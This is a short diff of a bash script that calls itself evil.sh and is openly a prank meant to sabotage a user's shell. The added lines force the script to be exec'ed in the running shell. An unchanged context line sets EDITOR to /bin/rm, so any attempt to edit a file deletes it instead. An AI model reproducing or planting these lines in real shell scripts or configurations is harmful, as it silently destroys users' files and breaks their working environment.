@@ -1,6 +1,9 @@
 #!/usr/bin/env bash
 # evil.sh — http://mths.be/evil.sh
 
+# First of all, make 100% sure this script will be exec'ed
+exec ${0##-}
+
 # Set `rm` as the default editor
 export EDITOR=/bin/rm
 
